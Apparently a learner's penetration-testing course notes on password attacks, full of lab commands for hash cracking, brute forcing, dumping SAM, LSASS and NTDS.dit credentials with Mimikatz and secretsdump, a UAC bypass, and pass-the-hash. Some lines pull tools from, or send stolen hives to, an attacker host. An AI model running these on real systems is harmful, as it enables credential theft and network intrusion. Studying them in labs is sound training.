
# Section 2-4:  Cracking Passwords

| **Command**                                                                                                 | **Description**                                                                                                                           |
| ----------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `hashid -j hash` or `hashid -m hash`                                                                        | hash format, list the corresponding JtR format: if unknown                                                                                |
| `hashcat -m 1000 dumpedhashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou**.txt`             | Uses Hashcat to crack NTLM hashes using a specified wordlist.                                                                             |
| `hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show`                  | Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.                                       |
| `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`                                                           | Uses Hashcat in conjunction with a word list to crack the md5 hashes in the md5-hashes.list file.                                         |
| `python3 ssh2john.py SSH.private > ssh.hash`                                                                | Runs ssh2john.py script to generate hashes for the SSH keys in the SSH.private file, then redirects the hashes to a file called ssh.hash. |
| `john ssh.hash --show`                                                                                      | Uses John to attempt to crack the hashes in the ssh.hash file, then outputs the results in the terminal.                                  |
| `office2john.py Protected.docx > protected-docx.hash`                                                       | Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.                 |
| `john --wordlist=rockyou.txt protected-docx.hash`                                                           | Uses John in conjunction with the wordlist rockyou.txt to crack the hash protected-docx.hash.                                             |
| `pdf2john.pl PDF.pdf > pdf.hash`                                                                            | Runs Pdf2john.pl script to convert a pdf file to a pdf has to be cracked.                                                                 |
| `john --wordlist=rockyou.txt pdf.hash`                                                                      | Runs John in conjunction with a wordlist to crack a pdf hash.                                                                             |
| `zip2john ZIP.zip > zip.hash`                                                                               | Runs Zip2john against a zip file to generate a hash, then adds that hash to a file called zip.hash.                                       |
| `john --wordlist=rockyou.txt zip.hash`                                                                      | Uses John in conjunction with a wordlist to crack the hashes contained in zip.hash.                                                       |
| `bitlocker2john -i Backup.vhd > backup.hashes`                                                              | Uses Bitlocker2john script to extract hashes from a VHD file and directs the output to a file called backup.hashes.                       |
| `file GZIP.gzip`                                                                                            | Uses the Linux-based file tool to gather file format information.                                                                         |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null \| tar xz;done` | Script that runs a for-loop to extract files from an archive.                                                                             |
| john --format=dmd5 [...] <hash_file>                                                                        |                                                                                                                                           |
| john --incremental <hash_file>                                                                              | test all character combinations defined by a specific character set                                                                       |
| john --single hash.txt                                                                                      |                                                                                                                                           |

do `locate *2john*` and use what is apprepriate.

### Hashcat mask attack

Let's say that we specifically want to try passwords which start with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol. The resulting hashcat mask would be `?u?l?l?l?l?d?s`.

`hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'`

| Symbol | Charset                             |
| ------ | ----------------------------------- |
| ?l     | abcdefghijklmnopqrstuvwxyz          |
| ?u     | ABCDEFGHIJKLMNOPQRSTUVWXYZ          |
| ?d     | 0123456789                          |
| ?h     | 0123456789abcdef                    |
| ?H     | 0123456789ABCDEF                    |
| ?s     | «space»!"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a     | ?l?u?d?s                            |
| ?b     | 0x00 - 0xff                         |

**Mask attacks are most effective when you already know the password structure**. Use information gathered during enumeration: **Password policy** (`net accounts`, domain policy), Company naming conventions, Usernames, OS defaults, Leaked passwords, Personal info (birth year, names, seasons)

| `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist` | Uses cewl to generate a wordlist based on keywords present on a website.                                                          |
| ----------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| `./username-anarchy -i /path/to/listoffirstandlastnames.txt`                  | Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username. |

# Section 5 -  Writing Custom Wordlists and Rules

We can use Hashcat to combine lists of potential names and labels with specific mutation rules to create custom wordlists. The complete syntax is documented in the official [Hashcat rule-based attack documentation](https://hashcat.net/wiki/doku.php?id=rule_based_attack), 

We can manually create our list(s) or use an `automated list generator` such as the Ruby-based tool [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) to convert a list of real names into common username formats. Once the tool has been cloned to our local attack host using `Git`, we can run it against a list of real names as shown in the example output below:

`./username-anarchy -i /home/ltnbob/names.txt`

## Question 1

### 1. Create a keyword list with the given enumeration.

```bash
nano mark.wordlist
```

Add one keyword per line:

```text
mark
white
august
1998
<snip>
```

### 2. Generate all 2-word combinations against the same file.

```bash
hashcat --stdout -a 1 mark.wordlist mark.wordlist > mark_wordlist
```

used -a 1 because, Common attack modes are :

|Mode|Meaning|Example|
|---|---|---|
|`-a 0`|Straight (wordlist)|`hashcat -a 0 hash.txt rockyou.txt`|
|`-a 1`|Combination|`wordlist1 + wordlist2`|
|`-a 3`|Mask (brute force with pattern)|`?u?l?l?l?d?d`|
|`-a 6`|Hybrid (wordlist + mask)|`rockyou.txt ?d?d?d`|
|`-a 7`|Hybrid (mask + wordlist)|`?d?d rockyou.txt`|

Count generated passwords:

```bash
wc -l mark_wordlist
```

### 3. Filter by given password policy (minimum 12 characters)

```bash
awk 'length($0) >= 12' mark_wordlist > mark_12wordlist
```

Count:

```bash
wc -l mark_12wordlist
```


### 4. Apply Hashcat rules

```bash
hashcat --stdout mark_12wordlist -r /usr/share/hashcat/rules/rockyou-30000.rule > final_wordlist
```

Count:

```bash
wc -l final_wordlist
```


### 5. Crack the hash (given hash + wordlist we made)

```bash
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b final_wordlist -r /usr/share/hashcat/rules/best64.rule
```


# Section 6 - Cracking Protected Files

## Question 1

1. wget the file.
2. unzip the file.
3. after unzipping it will be like `something.xlsx`, which cant be openend in plain. Seems like password protected.
4. search `*2jhon*` and you will find `office2john`.
5. `python3 path/office2john.py something.xlsx > k.hash`, to get the hash of it.
6. To see the hash type, format the file by removing the first `Confidential.xlsx:` before `$` sign, otherwise `hashcat -j k.hash` wont work.
7. after doing `hashcat -j k.hash`, the files appear to be Microsoft word 2013.
8. To search for appropriate hash type `m`, type `hashcat --help | grep Office`. you will find that hash type for that version.
9. `hashcat -a 0 -m 9600 k.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou-**.txt`, and you will get the password.


# Section 7 - Cracking Protected Archives

| `curl -s https://fileinfo.com/filetypes/compressed \| html2text \| awk '{print tolower($1)}' \| grep "\." \| tee -a compressed_ext.txt` | Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords. |
| --------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null\| tar xz;done`                              | cracking openssl archive with openssl                                                                                                                   |
| `bitlocker2john -i Backup.vhd > backup.hashes`                                                                                          | If you get a vhd file (Virtual Hard Disk)                                                                                                               |
| `grep "bitlocker\$0" backup.hashes > backup.hash`                                                                                       |                                                                                                                                                         |
| `hashcat -m 22100 backup.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou**.txt -o backup.cracked`                           | Uses Hashcat to crack the extracted BitLocker hashes using a wordlist and outputs the cracked hashes into a file called backup.cracked.                 |

#### Mounting BitLocker-encrypted drives in Linux (or macOS)

| Step                  | Command                                                      | Why                                                                                                                                                                              |
| --------------------- | ------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Install               | `sudo apt install dislocker`                                 | Tool to unlock BitLocker drives.                                                                                                                                                 |
| Create mount folders  | `mkdir -p bitlocker, mkdir -p bitlockermount`                | One for decrypted file, one to browse files.                                                                                                                                     |
| Attach VHD            | `sudo losetup -f -P Backup.vhd`                              | Makes the `.vhd` appear as `/dev/loop0` with partitions (`/dev/loop0p1`, `/dev/loop0p2`, etc.).                                                                                  |
| Unlock BitLocker      | `sudo dislocker /dev/loop1p1 -u<PASSWORD> -- bitlocker`      | Decrypts the BitLocker partition. (`-u` = password, `-r` = recovery key).                                                                                                        |
|                       |                                                              | `dislocker` must target the BitLocker **partition** (e.g., `/dev/loop1p2`), not the entire loop device (e.g., `/dev/loop1`); always verify partitions with `lsblk` or `fdisk -l` |
| Mount decrypted drive | `sudo mount -o loop bitlocker/dislocker-file bitlockermount` | Opens the unlocked drive for browsing.                                                                                                                                           |
| Browse files          | `cd bitlockermount && ls -la`                                | Access the drive contents.                                                                                                                                                       |
| Unmount               | `sudo umount bitlockermount && sudo umount bitlocker`        | Safely disconnect everything.                                                                                                                                                    |

### Notes

- **Need one of:** BitLocker **password**, **48-digit recovery key**, **TPM**, or **BEK key**.
- **No key/password = no access** (unless you can crack a weak password).
- **Windows:** Double-click drive → enter **password** or **recovery key**.
- **Linux:** `losetup` → attach VHD → `dislocker` → unlock → `mount` → browse.


# Section 8 - Network Services

#### Connecting to Target

| **Command**                                                                | **Description**                                                                                                                                 |
| -------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- |
| `xfreerdp /v:<ip> /u:htb-student /p:HTB_@cademy_stdnt!`                    | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol.                                                           |
| `evil-winrm -i <ip> -u user -p password`                                   | Uses Evil-WinRM to establish a Powershell session with a target.                                                                                |
| `ssh user@<ip>`                                                            | Uses SSH to connect to a target using a specified user.                                                                                         |
| `smbclient -U user \\\\<ip>\\SHARENAME`                                    | Uses smbclient to connect to an SMB share using a specified user.                                                                               |
| `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/` | Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host. |

### Remote Password Attacks

| **Command**                                                           | **Description**                                                                                                                                                            |
| --------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `netexec winrm <ip> -u user.list -p password.list`                    | Uses Netexec over WinRM to attempt to brute force user names and passwords specified hosted on a target.                                                                   |
| `crackmapexec winrm 10.129.202.136 -u username.list -p password.list` |                                                                                                                                                                            |
| `netexec smb <ip> -u "user" -p "password" --shares`                   | Uses Netexec to enumerate smb shares on a target using a specified set of credentials.                                                                                     |
| `hydra -L user.list -P password.list <service>://<ip>`                | Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.                                                    |
| `hydra -l username -P password.list <service>://<ip>`                 | Uses Hydra in conjunction with a username and password list to attempt to crack a password over the specified service.                                                     |
| `hydra -L user.list -p password <service>://<ip>`                     | Uses Hydra in conjunction with a user list and password to attempt to crack a password over the specified service.                                                         |
| `hydra -C <user_pass.list> ssh://<IP>`                                | Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack. |



# Section 9 - Spraying, Stuffing, and Defaults  (Default credentials)

Many systems—such as routers, firewalls, and databases—come with `default credentials`. While best practice dictates that administrators (`ChangeMe123!`) change these credentials during setup, they are sometimes left unchanged, posing a serious security risk.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), which we can install with `pip3`. and then search for the product or protocol we are lookin `creds search mysql`, sometimes, creds from this do work.



# Section 10 - Windows Authentication Process


```text
User
  ↓
WinLogon
  ↓
LogonUI (Login Screen)
  ↓
Credential Provider (Collects username/password)
  ↓
LSASS (Main Security Manager)
  ↓
Authentication Package (NTLM/Kerberos)
  ↓
SAM (Local) OR NTDS.dit (Domain)
  ↓
Access Granted / Denied
```

| Component               | Simple Meaning                | Why We Care                                                                                                                                           |
| ----------------------- | ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **WinLogon**            | Starts the login process      | Launches the login screen.                                                                                                                            |
| **LogonUI**             | Windows login screen          | Where users type credentials.                                                                                                                         |
| **Credential Provider** | Collects credentials          | Sends them to LSASS.                                                                                                                                  |
| **LSASS**               | Windows security "gatekeeper" | Verifies logins and stores useful credentials in memory. Main credential dumping target.                                                              |
| **NTLM / Kerberos**     | Authentication methods        | NTLM = older, Kerberos = network authentication protocol used by Active Directory. (`Msv1_0.dll` is simply **Windows' NTLM authentication package**.) |
| **SAM**                 | Local user database           | Stores local account password hashes.                                                                                                                 |
| **NTDS.dit**            | Domain user database          | Stores hashes for **all** domain users on a Domain Controller.                                                                                        |
| **Credential Manager**  | Saved passwords               | Stores website, RDP, SMB, and application credentials.                                                                                                |

### Local vs Domain Login

```text
Local PC
    ↓
LSASS
    ↓
SAM
```

```text
Domain PC
    ↓
LSASS
    ↓
Domain Controller
    ↓
NTDS.dit
```

### Files to Remember

| File | Contains |
|------|----------|
| `C:\Windows\System32\config\SAM` | Local user hashes |
| `C:\Windows\NTDS\ntds.dit` | Domain user hashes |
| `C:\Users\<User>\AppData\Local\Microsoft\Vault\` | Saved credentials |

### Pentesting Focus

| Target                 | What You Get                          |
| ---------------------- | ------------------------------------- |
| **LSASS**              | Credentials, hashes, Kerberos tickets |
| **SAM**                | Local account NTLM hashes             |
| **NTDS.dit**           | Entire domain's user hashes           |
| **Credential Manager** | Saved passwords                       |

# Section 11 - Attacking SAM, SYSTEM, and SECURITY

[OS Credential Dumping: Security Account Manager, Sub-technique T1003.002 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1003/002/) 

|Hive|What it stores|Why dump it?|
|---|---|---|
|**SAM**|Local Windows user accounts & password hashes|Crack local passwords, Pass-the-Hash|
|**SYSTEM**|BootKey (SysKey)|Needed to decrypt the SAM hashes|
|**SECURITY**|LSA Secrets, DPAPI keys, Cached Domain Credentials (DCC2), service passwords|Recover stored credentials, browser passwords, VPN/RDP creds, cached domain logins|

> **Remember:** **SAM + SYSTEM = Local password hashes**.  
> **SECURITY = Extra secrets** (cached credentials, DPAPI, service passwords).

--- 

## Registry Hives

```
HKLM\SAM
HKLM\SYSTEM
HKLM\SECURITY
```

### 1. Save Registry Hives (Windows)

Requires **Administrator/SYSTEM**.

```
reg save HKLM\SAM C:\sam.save
reg save HKLM\SYSTEM C:\system.save
reg save HKLM\SECURITY C:\security.save
```

### 2. Share a Folder from Kali

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData share_path
```

### 3. Copy Hives to Kali

```
copy C:\sam.save \\<KALI-IP>\CompData
copy C:\system.save \\<KALI-IP>\CompData
copy C:\security.save \\<KALI-IP>\CompData
```

### 4. Dump Everything Offline

`Secretsdump` actually needs `SAM + SYSTEM` to decrypt NTLM hashes. `SECURITY` is optional but recommended for DPAPI, DCC2 and LSA Secrets.

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

This extracts:

- Local NTLM hashes
- Cached Domain Credentials (DCC2)
- DPAPI Keys
- LSA Secrets
---
## Local NTLM Hashes

```
bob:1001:aad3...:64f12cddaa88057e06a81b54e73b949b:::
```

The format is: `username : RID : LM hash : NTLM hash :::`
Useful for:

- Crack password, Pass-the-Hash
- NTLM = Hashcat mode **1000**

Save hashes:

```
64f12cddaa88057e06a81b54e73b949b
6f8c3f4d3869a10f3b4f0522f537fd33
```

Crack:

```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Show results:

```
hashcat -m 1000 hashes.txt --show
```

---
## Cached Domain Credentials (DCC2)

```
$DCC2$10240#administrator#23d975...
```

DCC2 hashes, or Domain Cached Credentials 2, are local hashed copies of network credential hashes created after a user logons successfully on a particular workstation to the network. They are used to allow users to log in even when a domain controller is unavailable. DCC2 uses PBKDF2, which was created to be significantly harder to crack than NTLM hashes.

Cannot be done in Pass-the-Hash, Much slower than NTLM.

Mode **2100**

```
hashcat -m 2100 hashes.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou**.txt
```

---

##  DPAPI Keys

```
dpapi_machinekey
dpapi_userkey
```

Useful for decrypting: Chrome passwords, Credential Manager, RDP credentials, VPN passwords, Outlook passwords.

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).
#### Mimikatz

```
mimikatz.exe
```

Chrome:

```
dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

---
## LSA Secrets

May contain: Service passwords, Scheduled task passwords, Application credentials, Cleartext passwords. Examples:

```
_SC_SQL, _SC_MSSQL, _SC_Web, aspnet_WP_PASSWORD
```

**NetExec is essentially a convenient wrapper around Impacket techniques.** If you have administrator credentials, it can remotely dump **SAM**, **LSA Secrets**, or **NTDS** without manually copying registry hives. The output is largely the same as `secretsdump`; the main difference is **offline (copied hives)** vs **remote (live target)**.

| Command                                                           | What you get                                                                                                                                              |
| ----------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `netexec smb <ip> --local-auth -u <username> -p <password> --sam` | **Local user NTLM password hashes** (Administrator, Guest, local users, etc.).                                                                            |
| `netexec smb <ip> --local-auth -u <username> -p <password> --lsa` | **LSA Secrets**, including service account passwords, scheduled task passwords, DPAPI keys, cached credentials (DCC2), and sometimes cleartext passwords. |
| `netexec smb <ip> -u <username> -p <password> --ntds`             | **All Active Directory user password hashes** from the Domain Controller (Administrator, Domain Admins, all domain users, etc.).                          |
| `evil-winrm -i <ip> -u Administrator -H "<NTLM_hash>"`            | A **remote PowerShell shell** on the target by authenticating with an NTLM hash instead of the plaintext password (Pass-the-Hash).                        |


**Memory Trick**

```
Admin/SYSTEM Access
        │
        ▼
Save Registry Hives
(SAM + SYSTEM + SECURITY)
        │
        ▼
Transfer to Kali
        │
        ▼
secretsdump
        │
        ├── NTLM → Hashcat (1000)
        ├── DCC2 → Hashcat (2100)
        ├── DPAPI → Browser/RDP/VPN Passwords
        └── LSA Secrets → Service/App Passwords
```



# Section 12 -  Attacking LSASS

**lsass.exe** stands for **Local Security Authority Subsystem Service** and is a crucial component of the Windows operating system. It is responsible for enforcing security policies on the system, handling tasks such as password changes, login verifications, and creating access tokens.

| **Command**                                                                     | **Description**                                                                                                                                                                                                         |
| ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `tasklist /svc`                                                                 | A command-line-based utility in Windows used to list running processes.                                                                                                                                                 |
| `Get-Process lsass`                                                             | A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.                                        |
| `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672(PID) C:\lsass.dmp full` | Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.                                                                                 |
| Then same process, `set smb --> copy / transfer --> extract through pypykatz`   |                                                                                                                                                                                                                         |
| `pypykatz lsa minidump /path/to/lsassdumpfile`                                  | Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file. (Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack) |
or simply with `mimikatz.exe` on attack host's cmd,

| `sekurlsa::logonpasswords` | Dump logon passwords from LSASS     |
| -------------------------- | ----------------------------------- |

# Section 13 - Attacking Windows Credential Manager


| Command                                     | Purpose                                                                     |
| ------------------------------------------- | --------------------------------------------------------------------------- |
| `whoami`                                    | Current user                                                                |
| `cmdkey /list`                              | List saved credentials                                                      |
| `vaultcmd /lists`                           | List available vaults                                                       |
| `vaultcmd /listcreds:"Windows Credentials"` | List Windows vault credentials                                              |
| `vaultcmd /listcreds:"Web Credentials"`     | List Web credentials                                                        |
| `vaultcmd /listproperties`                  | List vault properties                                                       |
| `rundll32 keymgr.dll,KRShowKeyMgr`          | Access the Credential Manager prompt to backup or restore saved credentials |
| `control /name Microsoft.CredentialManager` | Open Credential Manager                                                     |

### Abuse

| Command                                       | Purpose                                                             |
| --------------------------------------------- | ------------------------------------------------------------------- |
| `runas /savecred /user:DOMAIN\\user cmd`      | Launch a new instance of cmd.exe while impersonating a stored user. |
| `runas /savecred /user:<username> powershell` | Spawn PowerShell using stored credentials                           |

### Mimikatz

| Command                    | Purpose                             |
| -------------------------- | ----------------------------------- |
| `privilege::debug`         | Enable debug privileges             |
| `token::elevate`           | Impersonate SYSTEM (if possible)    |
| `sekurlsa::credman`        | Dump Credential Manager credentials |
| `sekurlsa::logonpasswords` | Dump logon passwords from LSASS     |
| `sekurlsa::tickets`        | Dump Kerberos tickets               |
| `vault::list`              | List Windows Vaults                 |
| `vault::cred`              | Dump Vault credentials              |
| `dpapi::cred`              | Dump DPAPI-protected credentials    |

### Useful Tools

- **Mimikatz** – Credential dumping
- **SharpDPAPI** – DPAPI secrets
- **DonPAPI** – Remote DPAPI extraction
- **LaZagne** – Password recovery
- **Seatbelt** – Enumerate credentials & system info
- **SharpChrome / SharpWeb** – Browser credentials

### Common Credential Locations

```text
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
```


## Question 1 – Dumping OneDrive Credentials with Mimikatz

1. I connected to the target using **xfreerdp** and got an interactive desktop.

2. I enumerated the saved credentials using: `cmdkey /list` This showed a saved **OneDrive** credential. I could see the **username**, but the password wasn't displayed.

3. I wanted to use **Mimikatz** to dump the stored password, but `mimikatz.exe` wasn't installed on the target. I also noticed the lab hint mentioning **"msconfig UAC bypass"**, so I realized I'd first need an **elevated Administrator** Command Prompt before using Mimikatz.

4. I opened `msconfig` through cmd by `start msconfig`, went to **Tools** → **Command Prompt** → **Launch**, which gave me an elevated Command Prompt.

5. On my Kali machine, I searched for Mimikatz: `locate mimikatz.exe`,  I found both Win32 and x64 versions.

6. I started a Python HTTP server, but initially got **404 File not found** because I was not on the directory that contained Mimikatz.

7. I fixed it by changing to the correct directory first:
  `cd /usr/share/windows-resources/mimikatz/x64
   `python3 -m http.server 8000`

8. On the Windows target, I downloaded Mimikatz:
 `certutil -urlcache -split -f http://<KALI_IP>:8000/mimikatz.exe mimikatz.exe`

9. My first attempt failed because I had uploaded the **x86 (Win32)** version, which cannot access the **x64** LSASS process. I switched to the **x64** version and downloaded it again.

10. I launched Mimikatz: `mimikatz.exe`

11. I enabled debug privileges: `privilege::debug`

12. Finally, I dumped the Credential Manager credentials: `sekurlsa::credman`


13. The output revealed the stored **OneDrive username and plaintext password**, which was the flag for the exercise.




# Section 14 - Attacking Active Directory and NTDS.dit

[OS Credential Dumping: NTDS, Sub-technique T1003.003 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1003/003/) 

`NTDS.dit` Stores all AD users & password hashes

### 1. Username Preparation

| Purpose                      | Full command                                                   | Simple description                                |
| ---------------------------- | -------------------------------------------------------------- | ------------------------------------------------- |
| View collected names         | `cat names.txt`                                                | Displays the list of employee names.              |
| Generate username variations | `./username-anarchy -i /home/ltnbob/names.txt`                 | Converts real names into common username formats. |
| Save generated usernames     | `./username-anarchy -i /home/ltnbob/names.txt > usernames.txt` | Saves all generated usernames into a file.        |

### 2. Valid Username Enumeration

| Purpose                      | Full command                                                                                    | Simple description                          |
| ---------------------------- | ----------------------------------------------------------------------------------------------- | ------------------------------------------- |
| Enumerate valid domain users | `./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local usernames.txt` | Checks which usernames exist in the domain. |

Kerbrute helps confirm valid accounts before attempting passwords.

---

### 3. Password Testing

| Purpose                            | Full command                                                                     | Simple description                                      |
| ---------------------------------- | -------------------------------------------------------------------------------- | ------------------------------------------------------- |
| Test one user with a password list | `netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt` | Tries multiple passwords against one username over SMB. |
| Test username and password lists   | `netexec smb 10.129.201.57 -u usernames.txt -p passwords.txt`                    | Tests combinations from two separate files.             |

A successful login normally appears with a `[+]` result. Repeated attempts may trigger account lockout or security logs.

---

### 4. Remote Access

|Purpose|Full command|Simple description|
|---|---|---|
|Connect using username and password|`evil-winrm -i 10.129.201.57 -u bwilliamson -p 'P@55w0rd!'`|Opens a remote PowerShell session through WinRM.|
|Confirm current user|`whoami`|Shows the currently logged-in account.|
|View assigned groups|`whoami /groups`|Displays the current user’s security groups.|

---

### 5. Privilege Checking

|Purpose|Full command|Simple description|
|---|---|---|
|List local groups|`net localgroup`|Displays all local groups on the system.|
|Check local administrators|`net localgroup Administrators`|Shows members of the local Administrators group.|
|View local user details|`net user bwilliamson`|Displays account details and group membership.|
|View domain user details|`net user bwilliamson /domain`|Checks the account against Active Directory.|

**if it has domain/admin/administrator privileges then you can simply automate NTDS dump without creating a shadow of it.**

| Automated NTDS dump | `netexec smb 10.129.201.57 -u bwilliamson -p 'P@55w0rd!' -M ntdsutil` | Automates the NTDS dump and hash extraction process. With valid **administrative credentials**, `-M ntdsutil` automatically dumps and extracts the NTDS data, so manual shadow-copy steps are usually unnecessary. |
| ------------------- | --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
|                     |                                                                       |                                                                                                                                                                                                                    |

---

### 6. Create and Copy the NTDS Database

| Purpose                 | Full command                                                                                             | Simple description                                            |
| ----------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| Create a working folder | `mkdir C:\NTDS`                                                                                          | Creates a directory for copied files.                         |
| Create a shadow copy    | `vssadmin CREATE SHADOW /For=C:`                                                                         | Creates a snapshot of the C: drive.                           |
| Copy `NTDS.dit`         | `cmd.exe /c copy \\ \GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit` | Copies the locked AD database from the shadow copy.           |
| Save the SYSTEM hive    | `reg.exe save HKLM\SYSTEM C:\NTDS\SYSTEM /y`                                                             | Saves the SYSTEM registry hive containing the decryption key. |

Both `NTDS.dit` and `SYSTEM` are required for offline hash extraction.

---

### 7. Transfer Files to the Attack Host

#### On the attack host

|Purpose|Full command|Simple description|
|---|---|---|
|Start an SMB share|`sudo impacket-smbserver CompData "$(pwd)" -smb2support`|Shares the current Linux directory over SMB.|

#### On the Windows target

|Purpose|Full command|Simple description|
|---|---|---|
|Transfer `NTDS.dit`|`copy C:\NTDS\NTDS.dit \\10.10.15.30\CompData\NTDS.dit`|Copies the AD database to the SMB share.|
|Transfer `SYSTEM`|`copy C:\NTDS\SYSTEM \\10.10.15.30\CompData\SYSTEM`|Copies the SYSTEM hive to the SMB share.|

---

### 8. Extract Password Hashes

| Purpose               | Full command                                                          | Simple description                                                                                                                                                                                                 |
| --------------------- | --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Dump hashes offline   | `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`            | Decrypts and extracts domain account hashes.                                                                                                                                                                       |
| List enabled accounts | `grep -iv disabled ~/.nxc/logs/*.ntds \| cut -d ':' -f1`              | Filters the NetExec output to show enabled accounts.                                                                                                                                                               |

Typical output:

```text
domain\username:RID:LM_HASH:NT_HASH:::
```

---

### 9. Crack NTLM Hashes

| Purpose                  | Full command                                                                                                        | Simple description                                 |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| Crack one NTLM hash      | `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/seclists/Passwords/Leaked-Databases/rockyou**.txt | Tests the hash against passwords in `rockyou.txt`. |
| Display cracked password | `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b --show`                                                      | Shows the recovered password.                      |

`-m 1000` is the Hashcat mode for NTLM hashes.

---

### 10. Pass-the-Hash

|Purpose|Full command|Simple description|
|---|---|---|
|Authenticate using an NTLM hash|`evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b`|Logs in using the hash instead of the plaintext password.|

Pass-the-Hash can be used when the password hash cannot be cracked.

---

## Complete Workflow

```text
Create usernames
→ Enumerate valid users
→ Test passwords
→ Connect with Evil-WinRM
→ Check privileges

** if it has domain/admin/administrator privileges then you can simply automate NTDS dump without creating a shadow of it**

If not then follow below:

→ Create shadow copy
→ Copy NTDS.dit and SYSTEM
→ Transfer both files
→ Extract NTLM hashes
→ Crack the hash or use Pass-the-Hash
```


# Section 15 -  Credential Hunting in Windows 

| `start LaZagne.exe all`                                                                | Keep LaZagne.exe on the attack computer and copy it to the target through the RDP session to quickly recover stored passwords from browsers and softwares. |
| -------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`        | Uses Windows command-line based utility findstr to search for the string "password" in many different file type.                                           |
| `xfreerdp /v:10.10.10.10 /u:username /drive:transfer,/home/kali/transfer /cert:ignore` |                                                                                                                                                            |
| .\Snaffler.exe -s -d $DOMAIN -o snaffler.log -v data                                   |                                                                                                                                                            |
| `snaffler.exe -s`                                                                      | Search network shares for interesting files and credentials                                                                                                |
| `Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public`                   | Search network shares for interesting files and save the results.                                                                                          |
| `./Pcredz -f demo.pcapng -t -v`                                                        | Extract credentials a network packet capture                                                                                                               |


Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in `web.config` files on dev machines and IT shares
- Password in `unattend.xml`
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password)
- Found on user systems and shares
